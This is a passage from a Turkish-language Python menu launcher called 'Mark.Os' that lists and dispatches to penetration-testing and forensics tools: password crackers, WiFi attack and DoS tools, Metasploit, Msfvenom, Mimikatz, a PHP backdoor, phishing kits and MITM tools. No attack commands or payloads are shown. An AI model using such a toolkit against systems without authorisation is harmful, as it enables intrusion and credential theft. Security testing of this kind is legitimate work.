        "18": ("Wafw00f — WAF Tespiti", t18_wafw00f),
        "19": ("SpiderFoot — Otomatik OSINT", t19_spiderfoot),
        "20": ("Osintgram — Instagram OSINT", t20_osintgram),
    },
    "=== ZAFİYET ANALİZİ (VULNERABILITY ANALYSIS) ===": {
        "21": ("Nikto — Web Zafiyet Tarayıcı", t21_nikto),
        "22": ("Nmap Vuln Scripts — Zafiyet Tarama", t22_nmap_vuln),
        "23": ("Lynis — Sistem Denetimi", t23_lynis),
        "24": ("OpenVAS/GVM — Zafiyet Yönetimi", t24_openvas),
        "25": ("SQLMap — SQL Injection", t25_sqlmap),
        "26": ("Legion — Otomatik Zafiyet", t26_legion_vuln),
        "27": ("SearchSploit — Exploit Arama", t27_searchsploit),
        "28": ("GVM Scan — Greenbone Tarama", t28_gvm_scan),
        "29": ("Nuclei — Otomatik Zafiyet", t29_nuclei),
        "30": ("Skipfish — Web Uygulama Tarama", t30_skipfish),
    },
    "=== WEB UYGULAMA TESTLERİ ===": {
        "31": ("Burp Suite — Web Proxy", t31_burpsuite),
        "32": ("OWASP ZAP — Web Tarayıcı", t32_zaproxy),
        "33": ("Dirb — Dizin Brute-Force", t33_dirb),
        "34": ("Gobuster — Dizin/DNS/Virtual Host", t34_gobuster),
        "35": ("Wfuzz — Web Fuzzer", t35_wfuzz),
        "36": ("WPScan — WordPress Tarayıcı", t36_wpscan),
        "37": ("Commix — Command Injection", t37_commix),
        "38": ("WhatWeb — Web Teknoloji Tespiti", t38_whatweb),
        "39": ("XSSer — XSS Tarayıcı", t39_xsser),
        "40": ("XSStrike — XSS Bulucu", t40_xsstrike),
        "41": ("DAVTest — WebDAV Test", t41_davtest),
        "42": ("Fimap — LFI/RFI Tarayıcı", t42_fimap),
        "43": ("PadBuster — Padding Oracle", t43_padbuster),
        "44": ("WebSlayer — Web Brute-Force", t44_webslayer),
        "45": ("Jboss-Autopwn — JBoss Exploit", t45_jboss_autopwn),
    },
    "=== VERİTABANI DEĞERLENDİRME ===": {
        "46": ("SQLMap — SQL Injection", t46_sqlmap_db),
        "47": ("Sqlninja — MSSQL Injection", t47_sqlninja),
        "48": ("Tnscmd10g — Oracle TNS", t48_tnscmd10g),
    },
    "=== ŞİFRE SALDIRILARI ===": {
        "61": ("Hashcat — GPU Hash Kırıcı", t61_hashcat),
        "62": ("John the Ripper — Hash Kırıcı", t62_john),
        "63": ("Hydra — Çevrimiçi Brute-Force", t63_hydra),
        "64": ("Medusa — Hızlı Brute-Force", t64_medusa),
        "65": ("Ncrack — Ağ Brute-Force", t65_ncrack),
        "66": ("Crunch — Wordlist Üretici", t66_crunch),
        "67": ("CeWL — Özel Wordlist", t67_cewl),
        "68": ("Wordlists — RockYou & Dizin", t68_wordlists),
        "69": ("RainbowCrack — Rainbow Table", t69_rainbowcrack),
        "70": ("Johnny — John GUI", t70_johnny),
        "71": ("Samdump2 — SAM Hash Çıkarıcı", t71_samdump2),
        "72": ("TrueCrack — TrueCrypt Kırıcı", t72_truecrack),
    },
    "=== KABLOSUZ AĞ SALDIRILARI ===": {
        "81": ("Aircrack-ng Suite — WiFi Kırma", t81_aircrack),
        "82": ("Wifite — Otomatik WiFi", t82_wifite),
        "83": ("Reaver — WPS PIN Kırma", t83_reaver),
        "84": ("Pixiewps — WPS Pixie Dust", t84_pixiewps),
        "85": ("Bully — WPS Brute-Force", t85_bully),
        "86": ("Cowpatty — WPA Handshake", t86_cowpatty),
        "87": ("Kismet — WiFi Sniffer", t87_kismet),
        "88": ("MDK3 — WiFi DoS", t88_mdk3),
        "89": ("MDK4 — WiFi DoS v4", t89_mdk4),
        "90": ("WiFi Honey — Sahte AP", t90_wifi_honey),
        "91": ("Hostapd-WPE — Evil Twin", t91_hostapd_wpe),
        "92": ("Airgeddon — Tümleşik WiFi", t92_airgeddon),
    },
    "=== SIZMA ARAÇLARI (EXPLOITATION) ===": {
        "101": ("Metasploit Console", t101_msfconsole),
        "102": ("Msfvenom — Payload Üretici", t102_msfvenom),
        "103": ("BeEF — Browser Exploitation", t103_beef),
        "104": ("SearchSploit", t104_searchsploit),
        "105": ("Armitage — Metasploit GUI", t105_armitage),
        "106": ("RouterSploit — Router Exploit", t106_routersploit),
        "107": ("Commix — Command Injection", t107_commix_exp),
        "108": ("ExploitDB — Exploit Database", t108_exploitdb),
        "109": ("SEToolkit — Sosyal Mühendislik", t109_setoolkit),
        "110": ("Weevely — PHP Backdoor", t110_weevely),
        "111": ("PowerSploit — PowerShell", t111_powersploit),
        "112": ("Mimikatz — Windows Credential", t112_mimikatz),
        "113": ("Nishang — PowerShell Payload", t113_nishang),
    },
    "=== SNIFFING & SPOOFING ===": {
        "114": ("Wireshark — Paket Analizörü", t114_wireshark),
        "115": ("Ettercap — MITM Aracı", t115_ettercap),
        "116": ("Bettercap — Modern MITM", t116_bettercap),
        "117": ("Dsniff — Klasik Sniffer", t117_dsniff),
        "118": ("Netsniff-ng — Yüksek Performans", t118_netsniff),
        "119": ("Responder — LLMNR/NBT-NS Poison", t119_responder),
        "120": ("SSLstrip — HTTPS Downgrade", t120_sslstrip),
        "121": ("Tcpdump — CLI Paket Yakalama", t121_tcpdump),
        "122": ("Tshark — Wireshark CLI", t122_tshark),
        "123": ("Driftnet — Görsel Sniffer", t123_driftnet),
        "124": ("Macchanger — MAC Değiştirici", t124_macchanger),
    },
    "=== ADLİ BİLİŞİM (FORENSICS) ===": {
        "131": ("Autopsy — Dijital Adli Analiz", t131_autopsy),
        "132": ("Binwalk — Dosya Analizi", t132_binwalk),
        "133": ("Bulk Extractor — Veri Çıkarım", t133_bulk_extractor),
        "134": ("Chkrootkit — Rootkit Tarama", t134_chkrootkit),
        "135": ("Foremost — Dosya Kurtarma", t135_foremost),
        "136": ("Scalpel — Dosya Carve", t136_scalpel),
        "137": ("Sleuth Kit — Adli Kütüphane", t137_sleuthkit),
        "138": ("Volatility — Bellek Analizi", t138_volatility),
        "139": ("PDF-Parser — PDF Analizi", t139_pdf_parser),
        "140": ("Peepdf — PDF Analiz", t140_peepdf),
        "141": ("ExifTool — Metadata", t141_exiftool),
        "142": ("Rifiuti — Recycle Bin", t142_rifiuti),
        "143": ("Pcapfix — PCAP Onarım", t143_pcapfix),
        "144": ("Hashdeep — Hash Bütünlük", t144_hashdeep),
        "145": ("Galleta — IE Cookie", t145_galleta),
    },
    "=== REVERSE ENGINEERING & MISC ===": {
        "146": ("Apktool — APK Analizi", t146_apktool),
        "147": ("Dex2Jar — Android Reverse", t147_dex2jar),
        "148": ("Radare2 — Binary Analiz", t148_radare2),
        "149": ("EDB Debugger — GUI Debugger", t149_edb),
        "150": ("Ghidra — NSA Reverse Eng.", t150_ghidra),
        "151": ("Faraday — Pentest IDE", t151_faraday),
        "152": ("Dradis — Raporlama", t152_dradis),
        "153": ("King Phisher — Phishing", t153_king_phisher),
        "154": ("Ophcrack — Windows Hash", t154_ophcrack),
        "155": ("Ncat — Gelişmiş Netcat", t155_ncat),
    }
}

def main():
    while True:
        banner()
        for category, items in MENU.items():
            print(f"\n{Fore.MAGENTA}{category}")
            for num, (name, _) in items.items():
                print(f"  {Fore.YELLOW}{num:>3}{Fore.WHITE} - {name}")
        print(f"\n{Fore.RED}  0 - Sistemi Kapat")
        print(f"{Fore.CYAN}{'─'*70}")
        
        choice = input(f"{Fore.GREEN}Mark.Os> ").strip()
        if choice == "0":
            print(f"\n{Fore.GREEN}[+] Mark.Os kapatıldı. Hedef sistemi hackleme, sistemi koru!"); break
        
        found = False
        for category, items in MENU.items():
            if choice in items:
                items[choice][1]()
                found = True
                break
        
        if not found:
            print(f"{Fore.RED}[-] Geçersiz seçim! 0-155 arası girin.")
            time.sleep(1)
        else:
            pause()

if __name__ == "__main__":
    main()
